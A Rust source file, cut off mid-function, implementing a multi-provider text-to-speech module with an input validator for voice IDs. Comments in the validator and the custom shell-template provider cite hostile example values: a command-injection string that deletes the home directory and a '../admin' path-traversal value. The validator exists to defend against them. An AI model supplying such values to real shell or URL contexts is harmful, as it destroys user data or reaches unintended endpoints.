use std::path::Path;
use std::sync::{LazyLock, OnceLock};
use std::time::Duration;

use anyhow::{bail, Context, Result};
use regex::Regex;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use tracing::{debug, warn};

use crate::config::{Config, TtsModelConfig};

// ── Audio Format ──

/// Supported TTS output formats.
#[derive(Debug, Default, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum AudioFormat {
    /// MP3 format (default).
    #[default]
    Mp3,
    /// Opus format (Ogg container).
    Opus,
    /// AAC format.
    Aac,
    /// FLAC lossless format.
    Flac,
    /// WAV uncompressed format.
    Wav,
}

impl AudioFormat {
    /// Returns the MIME type string for this audio format.
    pub fn mime_type(&self) -> &str {
        match self {
            AudioFormat::Mp3 => "audio/mpeg",
            AudioFormat::Opus => "audio/ogg",
            AudioFormat::Aac => "audio/aac",
            AudioFormat::Flac => "audio/flac",
            AudioFormat::Wav => "audio/wav",
        }
    }

    /// Returns the file extension for this audio format.
    pub fn extension(&self) -> &str {
        match self {
            AudioFormat::Mp3 => "mp3",
            AudioFormat::Opus => "opus",
            AudioFormat::Aac => "aac",
            AudioFormat::Flac => "flac",
            AudioFormat::Wav => "wav",
        }
    }

    /// Parse from string (e.g. config value).
    pub fn from_str_lossy(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "mp3" => Some(AudioFormat::Mp3),
            "opus" | "ogg" => Some(AudioFormat::Opus),
            "aac" => Some(AudioFormat::Aac),
            "flac" => Some(AudioFormat::Flac),
            "wav" => Some(AudioFormat::Wav),
            _ => None,
        }
    }
}

// ── Synthesis Tracking ──

/// Outcome of a single provider synthesis attempt.
#[derive(Debug, Clone)]
pub enum SynthesisOutcome {
    /// Synthesis completed successfully.
    Success,
    /// Synthesis failed with the given error message.
    Failed(String),
}

/// Tracks each provider attempt in the fallback chain.
#[derive(Debug, Clone)]
pub struct SynthesisAttempt {
    /// Name of the TTS provider attempted.
    pub provider: String,
    /// Model identifier used for synthesis, if any.
    pub model: Option<String>,
    /// Whether the attempt succeeded or failed.
    pub outcome: SynthesisOutcome,
}

// ── Provider Trait ──

/// Request data for TTS providers.
struct SynthesisRequest<'a> {
    text: &'a str,
    voice: String,
    format: AudioFormat,
    model: Option<String>,
    timeout: Duration,
}

/// Provider-agnostic TTS trait.
#[async_trait::async_trait]
trait TtsProvider: Send + Sync {
    async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>>;
    fn name(&self) -> &str;
}

/// Strict voice-ID allowlist for providers that splice `voice` into a URL
/// path or a shell command. The LLM supplies `voice` via tool args, so this
/// is the trust boundary that keeps a hostile `voice = "$(rm -rf ~)"` or
/// `voice = "../admin"` out of shell/URL contexts. Providers that pass voice
/// only inside JSON/SSML bodies (Edge, Gemini, MiniMax, xAI, Mistral, OpenAI,
/// Piper) don't need this — `reqwest`/`serde_json` handle their escaping.
///
/// The character allowlist is `[A-Za-z0-9_.-]` so real-world voice names
/// like `en-US.male.1` still pass. A separate `..` rejection closes
/// path-traversal: `voice = ".."` would otherwise let a model pivot
/// ElevenLabs' `/v1/text-to-speech/{voice}` to a sibling endpoint.
pub(crate) fn validate_voice_id(voice: &str) -> Result<()> {
    if voice.is_empty() {
        bail!("voice id is empty");
    }
    if voice == "." || voice == ".." || voice.contains("..") {
        bail!("invalid voice id (path-traversal pattern): {voice:?}");
    }
    if !voice
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
    {
        bail!("invalid voice id: {voice:?}");
    }
    Ok(())
}

// ── OpenAI TTS Provider ──

/// OpenAI TTS provider (POST /v1/audio/speech).
struct OpenAiTtsProvider {
    client: Client,
    api_key: String,
    base_url: String,
    default_model: String,
}

#[async_trait::async_trait]
impl TtsProvider for OpenAiTtsProvider {
    async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>> {
        let model = req.model.as_deref().unwrap_or(&self.default_model);
        let url = format!("{}/v1/audio/speech", self.base_url);

        let body = serde_json::json!({
            "model": model,
            "input": req.text,
            "voice": req.voice,
            "response_format": req.format.extension(),
        });

        let resp = self
            .client
            .post(&url)
            .header("Authorization", format!("Bearer {}", self.api_key))
            .json(&body)
            .timeout(req.timeout)
            .send()
            .await?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("OpenAI TTS returned {status}: {body}");
        }

        Ok(resp.bytes().await?.to_vec())
    }

    fn name(&self) -> &str {
        "openai"
    }
}

// ── ElevenLabs TTS Provider ──

/// Map AudioFormat to ElevenLabs output_format query parameter.
fn elevenlabs_format(fmt: AudioFormat) -> &'static str {
    match fmt {
        AudioFormat::Mp3 => "mp3_44100_128",
        AudioFormat::Opus => "opus_16000",
        AudioFormat::Aac => "aac_44100",
        AudioFormat::Flac => "flac_44100",
        AudioFormat::Wav => "pcm_44100",
    }
}

/// ElevenLabs TTS provider (POST /v1/text-to-speech/{voice_id}).
struct ElevenLabsTtsProvider {
    client: Client,
    api_key: String,
    base_url: String,
    default_model: String,
}

#[async_trait::async_trait]
impl TtsProvider for ElevenLabsTtsProvider {
    async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>> {
        let model = req.model.as_deref().unwrap_or(&self.default_model);
        validate_voice_id(&req.voice).context("ElevenLabs voice id")?;
        let url = format!(
            "{}/v1/text-to-speech/{}",
            self.base_url.trim_end_matches('/'),
            req.voice
        );

        let body = serde_json::json!({
            "text": req.text,
            "model_id": model,
            "voice_settings": {
                "stability": 0.5,
                "similarity_boost": 0.5,
            },
        });

        let resp = self
            .client
            .post(&url)
            .header("xi-api-key", &self.api_key)
            .query(&[("output_format", elevenlabs_format(req.format))])
            .json(&body)
            .timeout(req.timeout)
            .send()
            .await?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("ElevenLabs TTS returned {status}: {body}");
        }

        Ok(resp.bytes().await?.to_vec())
    }

    fn name(&self) -> &str {
        "elevenlabs"
    }
}

// ── Edge TTS Provider (Microsoft, free, no API key) ──

/// Microsoft Edge "Read aloud" TTS — the same endpoint
/// No API key required; voice resolution is via Microsoft's catalog.
///
/// Backed by the [`msedge_tts`](https://crates.io/crates/msedge-tts)
/// crate which encapsulates the WSS speech.config + SSML protocol with
/// the Sec-MS-GEC header dance that Microsoft now requires.
struct EdgeTtsProvider {
    default_voice: String,
}

#[async_trait::async_trait]
impl TtsProvider for EdgeTtsProvider {
    async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>> {
        use msedge_tts::tts::client::tokio_runtime::connect_async;
        use msedge_tts::tts::SpeechConfig;

        let voice_short = if req.voice.is_empty() {
            self.default_voice.clone()
        } else {
            req.voice.clone()
        };
        let text = req.text.to_string();
        let timeout = req.timeout;

        let fut = async move {
            // Microsoft expects the full voice_name like:
            //   "Microsoft Server Speech Text to Speech Voice (en-US, AvaMultilingualNeural)"
            // If the caller already supplied that full form, pass it through;
            // otherwise derive it from the locale-prefixed short name.
            let voice_name = if voice_short.starts_with("Microsoft Server Speech") {
                voice_short.clone()
            } else {
                expand_edge_voice_short_name(&voice_short)
            };
            let cfg = SpeechConfig {
                voice_name,
                audio_format: "audio-24khz-48kbitrate-mono-mp3".to_owned(),
                pitch: 0,
                rate: 0,
                volume: 0,
            };
            let mut client = connect_async()
                .await
                .map_err(|e| anyhow::anyhow!("Edge TTS connect: {e}"))?;
            let audio = client
                .synthesize(&text, &cfg)
                .await
                .map_err(|e| anyhow::anyhow!("Edge TTS synthesize: {e}"))?;
            Ok::<Vec<u8>, anyhow::Error>(audio.audio_bytes)
        };

        match tokio::time::timeout(timeout, fut).await {
            Ok(Ok(bytes)) => Ok(bytes),
            Ok(Err(e)) => Err(e),
            Err(_) => bail!("Edge TTS timed out after {timeout:?}"),
        }
    }

    fn name(&self) -> &str {
        "edge"
    }
}

/// Convert a short voice name like `en-US-AvaMultilingualNeural` into the
/// full Microsoft voice_name accepted by Edge TTS's WSS endpoint:
/// `Microsoft Server Speech Text to Speech Voice (en-US, AvaMultilingualNeural)`.
///
/// Split on the second `-` (after the language and region) so locales with
/// region codes like `pt-BR` round-trip correctly. Falls back to the input
/// untouched on malformed names — the server's error message will then
/// pinpoint the issue.
fn expand_edge_voice_short_name(short: &str) -> String {
    // Find the boundary between locale (lang-REGION) and voice name.
    let mut dash_count = 0;
    let split_at = short.char_indices().find_map(|(i, c)| {
        if c == '-' {
            dash_count += 1;
            if dash_count == 2 {
                return Some(i);
            }
        }
        None
    });
    let Some(idx) = split_at else {
        return short.to_string();
    };
    let locale = &short[..idx];
    let voice = &short[idx + 1..];
    format!("Microsoft Server Speech Text to Speech Voice ({locale}, {voice})")
}

// ── Gemini TTS Provider ──

/// Google Gemini TTS via `generateContent` with `responseModalities: ["AUDIO"]`.
///
/// Gemini returns raw 24 kHz mono 16-bit PCM (L16) as base64 JSON. We wrap
/// it with a WAV RIFF header so downstream players accept it as a normal
/// audio file.
struct GeminiTtsProvider {
    client: Client,
    api_key: String,
    base_url: String,
    default_model: String,
    default_voice: String,
}

const GEMINI_TTS_SAMPLE_RATE: u32 = 24_000;

#[async_trait::async_trait]
impl TtsProvider for GeminiTtsProvider {
    async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>> {
        let model = req.model.as_deref().unwrap_or(&self.default_model);
        let voice = if req.voice.is_empty() {
            self.default_voice.clone()
        } else {
            req.voice.clone()
        };
        let url = format!(
            "{}/models/{model}:generateContent",
            self.base_url.trim_end_matches('/')
        );

        let body = serde_json::json!({
            "contents": [{"parts": [{"text": req.text}]}],
            "generationConfig": {
                "responseModalities": ["AUDIO"],
                "speechConfig": {
                    "voiceConfig": {"prebuiltVoiceConfig": {"voiceName": voice}}
                }
            }
        });

        let resp = self
            .client
            .post(&url)
            .query(&[("key", &self.api_key)])
            .header("Content-Type", "application/json")
            .json(&body)
            .timeout(req.timeout)
            .send()
            .await?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("Gemini TTS returned {status}: {body}");
        }

        let json: serde_json::Value = resp.json().await?;
        let parts = json
            .get("candidates")
            .and_then(|c| c.get(0))
            .and_then(|c| c.get("content"))
            .and_then(|c| c.get("parts"))
            .and_then(|p| p.as_array())
            .ok_or_else(|| anyhow::anyhow!("Gemini TTS: candidates[0].content.parts missing"))?;

        let b64 = parts
            .iter()
            .find_map(|p| {
                p.get("inlineData")
                    .or_else(|| p.get("inline_data"))
                    .and_then(|i| i.get("data"))
                    .and_then(|d| d.as_str())
            })
            .ok_or_else(|| anyhow::anyhow!("Gemini TTS: no inlineData.data in response"))?;

        use base64::Engine;
        let pcm = base64::engine::general_purpose::STANDARD
            .decode(b64)
            .map_err(|e| anyhow::anyhow!("Gemini TTS base64 decode failed: {e}"))?;
        // Gemini only emits PCM regardless of req.format — wrap as WAV so
        // the system player accepts it. If the caller requested mp3/opus,
        // they get WAV bytes; downstream conversion (ffmpeg) is the
        // caller's responsibility, matching the behavior at
        // the JSON envelope shape.
        Ok(wrap_pcm_as_wav(&pcm, GEMINI_TTS_SAMPLE_RATE, 1, 16))
    }

    fn name(&self) -> &str {
        "gemini"
    }
}

/// Wrap raw signed-little-endian PCM with a standard WAV RIFF header.
fn wrap_pcm_as_wav(pcm: &[u8], sample_rate: u32, channels: u16, bits: u16) -> Vec<u8> {
    let byte_rate = sample_rate * channels as u32 * (bits / 8) as u32;
    let block_align: u16 = channels * (bits / 8);
    let data_size = pcm.len() as u32;
    let mut out = Vec::with_capacity(44 + pcm.len());
    out.extend_from_slice(b"RIFF");
    out.extend_from_slice(&(36 + data_size).to_le_bytes());
    out.extend_from_slice(b"WAVE");
    out.extend_from_slice(b"fmt ");
    out.extend_from_slice(&16u32.to_le_bytes()); // fmt chunk size
    out.extend_from_slice(&1u16.to_le_bytes()); // PCM
    out.extend_from_slice(&channels.to_le_bytes());
    out.extend_from_slice(&sample_rate.to_le_bytes());
    out.extend_from_slice(&byte_rate.to_le_bytes());
    out.extend_from_slice(&block_align.to_le_bytes());
    out.extend_from_slice(&bits.to_le_bytes());
    out.extend_from_slice(b"data");
    out.extend_from_slice(&data_size.to_le_bytes());
    out.extend_from_slice(pcm);
    out
}

// ── MiniMax TTS Provider ──

/// MiniMax t2a_v2 — nested voice/audio settings, returns hex-encoded MP3
/// in `data.audio`.
struct MiniMaxTtsProvider {
    client: Client,
    api_key: String,
    base_url: String,
    default_model: String,
    default_voice: String,
    /// MiniMax accounts scope requests by GroupId — when present, attached
    /// as `?GroupId=` on the base URL. Resolved from
    /// `MINIMAX_GROUP_ID` env at provider construction.
    group_id: Option<String>,
}

#[async_trait::async_trait]
impl TtsProvider for MiniMaxTtsProvider {
    async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>> {
        let model = req.model.as_deref().unwrap_or(&self.default_model);
        let voice = if req.voice.is_empty() {
            self.default_voice.clone()
        } else {
            req.voice.clone()
        };
        let mut url = self.base_url.clone();
        if let Some(gid) = &self.group_id {
            if !url.contains("GroupId=") {
                let sep = if url.contains('?') { "&" } else { "?" };
                url = format!("{url}{sep}GroupId={gid}");
            }
        }

        let body = serde_json::json!({
            "model": model,
            "text": req.text,
            "voice_setting": {"voice_id": voice, "speed": 1.0, "vol": 1.0, "pitch": 0, "emotion": "neutral"},
            "audio_setting": {"sample_rate": 32_000, "bitrate": 128_000, "format": "mp3", "channel": 1}
        });

        let resp = self
            .client
            .post(&url)
            .header("Authorization", format!("Bearer {}", self.api_key))
            .header("Content-Type", "application/json")
            .json(&body)
            .timeout(req.timeout)
            .send()
            .await?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("MiniMax TTS returned {status}: {body}");
        }

        let json: serde_json::Value = resp.json().await?;
        let status_code = json
            .get("base_resp")
            .and_then(|b| b.get("status_code"))
            .and_then(serde_json::Value::as_i64)
            .unwrap_or(-1);
        if status_code != 0 {
            let msg = json
                .get("base_resp")
                .and_then(|b| b.get("status_msg"))
                .and_then(|s| s.as_str())
                .unwrap_or("unknown");
            bail!("MiniMax TTS API error (code {status_code}): {msg}");
        }
        let hex_audio = json
            .get("data")
            .and_then(|d| d.get("audio"))
            .and_then(|a| a.as_str())
            .ok_or_else(|| anyhow::anyhow!("MiniMax TTS: data.audio missing"))?;
        decode_hex(hex_audio).ok_or_else(|| anyhow::anyhow!("MiniMax TTS: invalid hex audio data"))
    }

    fn name(&self) -> &str {
        "minimax"
    }
}

fn decode_hex(s: &str) -> Option<Vec<u8>> {
    if s.len() % 2 != 0 {
        return None;
    }
    let mut out = Vec::with_capacity(s.len() / 2);
    for chunk in s.as_bytes().chunks(2) {
        let h = (chunk[0] as char).to_digit(16)?;
        let l = (chunk[1] as char).to_digit(16)?;
        out.push(((h << 4) | l) as u8);
    }
    Some(out)
}

// ── xAI TTS Provider ──

/// xAI Grok TTS — `POST {base}/tts`, returns raw audio bytes (MP3 by
/// default; WAV when `output_format.codec` is set).
struct XaiTtsProvider {
    client: Client,
    api_key: String,
    base_url: String,
    default_voice: String,
    default_language: String,
    /// When true, run replies through `apply_xai_auto_speech_tags`
    /// before synthesis so Grok inserts a natural pause between the
    /// opening sentence and the body. Off by default (raw text); flip
    /// for conversational voice-mode replies.
    auto_speech_tags: bool,
}

/// True if `text` already contains explicit xAI speech tags. We leave
/// operator-marked-up text untouched so a deliberate `<whisper>...` is
/// not stripped by the auto-cadence layer. Mirrors the recognised tag
/// vocabulary from the reference implementation.
fn xai_text_has_speech_tags(text: &str) -> bool {
    // Inline tags: `[pause]`, `[laugh]`, `[breath]`, `[uh]`, `[um]`.
    // Wrapping tags: `<whisper>...</whisper>`, `<soft>...`, `<loud>...`,
    // `<singing>...`, `<laugh-speak>...`, `<emphasis>...`.
    static INLINE: &[&str] = &["[pause]", "[laugh]", "[breath]", "[uh]", "[um]"];
    static WRAPPING: &[&str] = &[
        "<whisper",
        "<soft",
        "<loud",
        "<singing",
        "<laugh-speak",
        "<emphasis",
    ];
    let lower = text.to_ascii_lowercase();
    INLINE.iter().any(|t| lower.contains(t)) || WRAPPING.iter().any(|t| lower.contains(t))
}

/// Light cadence transform for xAI TTS replies. Conservative on purpose:
/// it only ever *adds* `[pause]` markers around paragraph breaks and after
/// the opening sentence. It never invents whispers or laughter, and it
/// leaves text that already has speech tags untouched (so an operator who
/// hand-crafts a tagged reply gets that exact rendering).
///
/// Mirrors the reference behavior: paragraph break → `[pause]`, single
/// newlines collapse to spaces, then a `[pause]` after the first sentence
/// (12–120 chars terminated by `.`/`!`/`?`/`…`). Final cleanup collapses
/// any double-spaces the transform introduced.
pub fn apply_xai_auto_speech_tags(text: &str) -> String {
    // These four patterns are compile-time-constant literals, so a compile
    // failure is a programmer bug at static-init time, not a runtime risk —
    // same convention as `md_regexes` below. Hoisting them to `LazyLock`
    // compiles each once rather than on every call.
    #[allow(clippy::expect_used)]
    // Paragraph break → explicit pause marker. `(?s)` lets `.` match any
    // newline-inclusive whitespace run between the two `\n`s.
    static PARAGRAPH: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"(?s)\n\s*\n+").expect("paragraph regex"));
    #[allow(clippy::expect_used)]
    static SINGLE_NL: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"\s*\n\s*").expect("single_nl regex"));
    // First-sentence boundary: at least 12 chars, at most 120, ending in
    // `.`/`!`/`?`/`…` and followed by more text. The window prevents a
    // very short greeting ("Hi.") or a wall-of-text paragraph from getting
    // an awkward post-first-sentence pause. The `regex` crate does not
    // support lookaheads, so we capture the following non-whitespace
    // character into `$2` and stitch it back into the replacement —
    // semantically identical to `\s+(?=\S)` but NFA-compatible.
    #[allow(clippy::expect_used)]
    static FIRST_SENTENCE: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"(?s)^(.{12,120}?[.!?…])\s+(\S)").expect("first_sentence regex"));
    #[allow(clippy::expect_used)]
    static EXTRA_WS: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"\s{2,}").expect("extra_ws regex"));

    let clean = text.trim();
    if clean.is_empty() || xai_text_has_speech_tags(clean) {
        return text.to_string();
    }

    let mut out = PARAGRAPH.replace_all(clean, " [pause] ").into_owned();
    out = SINGLE_NL.replace_all(&out, " ").into_owned();
    out = FIRST_SENTENCE.replace(&out, "$1 [pause] $2").into_owned();
    out = EXTRA_WS.replace_all(&out, " ").into_owned();
    out.trim().to_string()
}

#[async_trait::async_trait]
impl TtsProvider for XaiTtsProvider {
    async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>> {
        let voice = if req.voice.is_empty() {
            self.default_voice.clone()
        } else {
            req.voice.clone()
        };
        let url = format!("{}/tts", self.base_url.trim_end_matches('/'));

        // Apply cadence-shaping speech tags only when the operator opted
        // in. Avoids changing the spoken output for callers that supply
        // pre-formatted text or rely on the legacy raw behavior.
        let text_for_synthesis: String = if self.auto_speech_tags {
            apply_xai_auto_speech_tags(req.text)
        } else {
            req.text.to_string()
        };
        let mut body = serde_json::json!({
            "text": text_for_synthesis,
            "voice_id": voice,
            "language": self.default_language,
        });
        // Only send output_format when not the documented default
        // (mp3 + 24kHz + 128kbps).
        if matches!(req.format, AudioFormat::Wav) {
            body["output_format"] = serde_json::json!({"codec": "wav", "sample_rate": 24_000});
        }

        let resp = self
            .client
            .post(&url)
            .header("Authorization", format!("Bearer {}", self.api_key))
            .header("Content-Type", "application/json")
            .json(&body)
            .timeout(req.timeout)
            .send()
            .await?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("xAI TTS returned {status}: {body}");
        }
        Ok(resp.bytes().await?.to_vec())
    }

    fn name(&self) -> &str {
        "xai"
    }
}

// ── Mistral TTS Provider (Voxtral) ──

/// Mistral Voxtral TTS — `POST {base}/v1/audio/speech` (OpenAI-shape
/// endpoint). Mistral returns a JSON envelope `{ "audio_data": "<b64>" }`
/// rather than raw audio bytes. Format follows the request's
/// `response_format` field — we pick `opus`/`wav`/`flac`/`mp3` based on
/// `req.format` with mp3 as the fallback.
struct MistralTtsProvider {
    client: Client,
    api_key: String,
    base_url: String,
    default_model: String,
    default_voice: String,
}

#[async_trait::async_trait]
impl TtsProvider for MistralTtsProvider {
    async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>> {
        let model = req.model.as_deref().unwrap_or(&self.default_model);
        let voice = if req.voice.is_empty() {
            self.default_voice.clone()
        } else {
            req.voice.clone()
        };
        let response_format = match req.format {
            AudioFormat::Mp3 => "mp3",
            AudioFormat::Opus => "opus",
            AudioFormat::Wav => "wav",
            AudioFormat::Flac => "flac",
            AudioFormat::Aac => "mp3", // Mistral doesn't list AAC; fall back to MP3
        };
        let url = format!("{}/v1/audio/speech", self.base_url.trim_end_matches('/'));

        let body = serde_json::json!({
            "model": model,
            "input": req.text,
            "voice_id": voice,
            "response_format": response_format,
        });

        let resp = self
            .client
            .post(&url)
            .header("Authorization", format!("Bearer {}", self.api_key))
            .header("Content-Type", "application/json")
            .json(&body)
            .timeout(req.timeout)
            .send()
            .await?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("Mistral TTS returned {status}: {body}");
        }

        // Mistral's content-type header is application/json; the audio
        // is base64 inside `audio_data`. Some Mistral deployments may
        // return raw bytes — detect by checking the first byte: a JSON
        // response always starts with `{` (0x7B).
        let bytes = resp.bytes().await?.to_vec();
        if bytes.first() == Some(&b'{') {
            let json: serde_json::Value = serde_json::from_slice(&bytes)
                .map_err(|e| anyhow::anyhow!("Mistral TTS: invalid JSON envelope: {e}"))?;
            let b64 = json
                .get("audio_data")
                .and_then(|v| v.as_str())
                .ok_or_else(|| anyhow::anyhow!("Mistral TTS: missing audio_data field"))?;
            use base64::Engine;
            base64::engine::general_purpose::STANDARD
                .decode(b64)
                .map_err(|e| anyhow::anyhow!("Mistral TTS base64 decode failed: {e}"))
        } else {
            Ok(bytes)
        }
    }

    fn name(&self) -> &str {
        "mistral"
    }
}

// ── Piper TTS Provider (local) ──

/// Piper TTS — shells to the local `piper` binary if installed on PATH.
/// The user provides `voice` as either an absolute `.onnx` path or a
/// short name like `en_US-lessac-medium` resolved against
/// `~/.borg/cache/piper-voices/`. Shells to the `piper` CLI to avoid
/// embedding the model loader inside borg.
struct PiperTtsProvider {
    default_voice: String,
    /// Directory holding `{voice}.onnx` + `{voice}.onnx.json` files when
    /// `voice` is given as a short name. Defaults to
    /// `~/.borg/cache/piper-voices/`.
    voices_dir: std::path::PathBuf,
}

#[async_trait::async_trait]
impl TtsProvider for PiperTtsProvider {
    async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>> {
        let voice = if req.voice.is_empty() {
            self.default_voice.clone()
        } else {
            req.voice.clone()
        };
        let model_path = self.resolve_voice_path(&voice)?;
        let text = req.text.to_string();
        let timeout = req.timeout;

        // Shell out off-runtime so a slow voice load doesn't stall tokio.
        tokio::task::spawn_blocking(move || piper_synthesize(&model_path, &text, timeout))
            .await
            .context("piper task panicked")?
    }

    fn name(&self) -> &str {
        "piper"
    }
}

impl PiperTtsProvider {
    fn resolve_voice_path(&self, voice: &str) -> Result<std::path::PathBuf> {
        let p = std::path::PathBuf::from(voice);
        if p.extension().is_some_and(|e| e == "onnx") && p.exists() {
            return Ok(p);
        }
        let cached = self.voices_dir.join(format!("{voice}.onnx"));
        if cached.exists() {
            return Ok(cached);
        }
        bail!(
            "Piper voice '{voice}' not found. Provide an absolute .onnx path, or download \
             into {} (e.g. via `python -m piper.download_voices {voice} --download-dir {}`)",
            self.voices_dir.display(),
            self.voices_dir.display()
        )
    }
}

fn piper_synthesize(model_path: &Path, text: &str, timeout: Duration) -> Result<Vec<u8>> {
    use std::io::Write as _;
    use std::process::{Command, Stdio};

    let piper = which::which("piper")
        .map_err(|_| anyhow::anyhow!("`piper` binary not on PATH — install piper-tts"))?;
    let tmp = tempfile::NamedTempFile::new()?;
    let tmp_path = tmp.path().to_path_buf();

    let mut child = Command::new(piper)
        .arg("-m")
        .arg(model_path)
        .arg("-f")
        .arg(&tmp_path)
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .context("spawn piper")?;
    if let Some(mut stdin) = child.stdin.take() {
        stdin
            .write_all(text.as_bytes())
            .context("write to piper stdin")?;
    }
    let started = std::time::Instant::now();
    loop {
        if started.elapsed() >= timeout {
            let _ = child.kill();
            let _ = child.wait();
            bail!("piper synthesis timed out after {timeout:?}");
        }
        match child.try_wait()? {
            Some(status) => {
                if !status.success() {
                    let mut err = String::new();
                    if let Some(mut s) = child.stderr.take() {
                        use std::io::Read as _;
                        let _ = s.read_to_string(&mut err);
                    }
                    bail!(
                        "piper exited with {:?}: {}",
                        status.code(),
                        err.trim().chars().take(300).collect::<String>()
                    );
                }
                break;
            }
            None => std::thread::sleep(Duration::from_millis(50)),
        }
    }
    std::fs::read(&tmp_path).context("read piper output wav")
}

// ── Custom TTS Provider ──

/// Custom TTS — shells out to an operator-defined command template.
/// Template tokens: `{text_file}` (path to a file containing the input
/// text), `{voice}`, `{out_path}`. Returns whatever bytes the command
/// writes to `{out_path}`. Configured via the `provider: custom` row
/// in `tts.providers` with a `command` template.
struct CustomTtsProvider {
    name: String,
    /// Command template with `{text_file}`, `{voice}`, `{out_path}`.
    command_template: String,
    default_voice: String,
    output_extension: String,
}

#[async_trait::async_trait]
impl TtsProvider for CustomTtsProvider {
    async fn synthesize(&self, req: &SynthesisRequest<'_>) -> Result<Vec<u8>> {
        let voice = if req.voice.is_empty() {
            self.default_voice.clone()
        } else {
            req.voice.clone()
        };
        let template = self.command_template.clone();
        let ext = self.output_extension.clone();
        let text = req.text.to_string();
        let timeout = req.timeout;

        tokio::task::spawn_blocking(move || {
            custom_synthesize(&template, &text, &voice, &ext, timeout)
        })
        .await
        .context("custom tts task panicked")?
    }

    fn name(&self) -> &str {
        &self.name
    }
}

fn custom_synthesize(
    template: &str,
    text: &str,
    voice: &str,
    extension: &str,
    timeout: Duration,
) -> Result<Vec<u8>> {
    use std::io::Write as _;
    use std::process::Command;

    // `{voice}` is substituted into the shell template via plain string
    // replacement before `sh -c`, so a hostile model supplying
    // `voice = "$(rm -rf ~)"` would otherwise execute arbitrary shell.
    // Reject anything outside the strict alphanumeric-plus-`-._` set
    // before substitution. Empty `voice` is allowed (operator templates
    // that don't reference `{voice}` legitimately leave it unset).
    if !voice.is_empty() {
        validate_voice_id(voice).context("custom TTS voice id")?;
    }

    // Write text to a tempfile so commands can `cat {text_file}` without
    // shell-escaping headaches around quotes/newlines in the prose.
    let mut text_file = tempfile::NamedTempFile::new()?;
    text_file.write_all(text.as_bytes())?;
    text_file.flush()?;
    let text_path = text_file.path().to_string_lossy().into_owned();
    let out_file = tempfile::Builder::new()
        .suffix(&format!(".{extension}"))
        .tempfile()?;
    let out_path = out_file.path().to_string_lossy().into_owned();

    let cmd_str = template
        .replace("{text_file}", &text_path)
        .replace("{voice}", voice)
        .replace("{out_path}", &out_path);

    let mut child = Command::new("sh")
        .arg("-c")
        .arg(&cmd_str)
        .spawn()
        .context("spawn custom tts")?;
    let started = std::time::Instant::now();
    loop {
        if started.elapsed() >= timeout {
            let _ = child.kill();
            let _ = child.wait();
            bail!("custom tts timed out after {timeout:?}");
        }
        match child.try_wait()? {
            Some(status) => {
                if !status.success() {
                    bail!("custom tts exited with {:?}", status.code());
                }
                break;
            }
            None => std::thread::sleep(Duration::from_millis(50)),
        }
    }
    std::fs::read(out_file.path()).context("read custom tts output")
}

// ── TTS Synthesizer ──

/// A provider with its per-model configuration.
struct TtsProviderEntry {
    provider: Box<dyn TtsProvider>,
    model: Option<String>,
    voice: Option<String>,
    timeout: Option<Duration>,
}

/// Main TTS engine with multi-provider fallback.
pub struct TtsSynthesizer {
    /// Ordered list of provider entries for fallback.
    entries: Vec<TtsProviderEntry>,
    /// Default voice identifier when none is specified.
    default_voice: String,
    /// Default audio output format.
    default_format: AudioFormat,
    /// Maximum allowed input text length in bytes.
    max_text_length: usize,
    /// Default HTTP timeout for synthesis requests.
    default_timeout: Duration,
}

impl TtsSynthesizer {
    /// Test-only constructor producing a synthesizer with no providers. Lets
    /// downstream handler tests exercise the "all providers failed" branch
    /// without spinning up a mock HTTP server.
    #[cfg(test)]
    pub(crate) fn empty_for_test() -> Self {
        Self {
            entries: Vec::new(),
            default_voice: "alloy".to_string(),
            default_format: AudioFormat::Mp3,
            max_text_length: 4096,
            default_timeout: Duration::from_secs(30),
        }
    }

    /// Test-only constructor that wires a single OpenAI-compatible provider
    /// at an operator-supplied `base_url` — typically a `wiremock::MockServer`
    /// uri. Lets handler tests exercise the happy path (Multimodal audio
    /// response, byte length, MIME) without depending on a real cloud API
    /// key. Production code MUST go through `from_config`.
    #[cfg(test)]
    pub(crate) fn single_openai_for_test(base_url: String, api_key: String) -> Self {
        Self {
            entries: vec![TtsProviderEntry {
                provider: Box::new(OpenAiTtsProvider {
                    client: Client::new(),
                    api_key,
                    base_url,
                    default_model: "tts-1".to_string(),
                }),
                model: None,
                voice: Some("alloy".to_string()),
                timeout: Some(Duration::from_secs(5)),
            }],
            default_voice: "alloy".to_string(),
            default_format: AudioFormat::Mp3,
            max_text_length: 4096,
            default_timeout: Duration::from_secs(5),
        }
    }

    /// Build TTS engine from config. Returns None if disabled or no providers available.
    pub fn from_config(config: &Config) -> Option<Self> {
        if !config.tts.enabled {
            return None;
        }

        let tts = &config.tts;
        let client = Client::new();
        let mut entries: Vec<TtsProviderEntry> = Vec::new();

        for model_cfg in &tts.models {
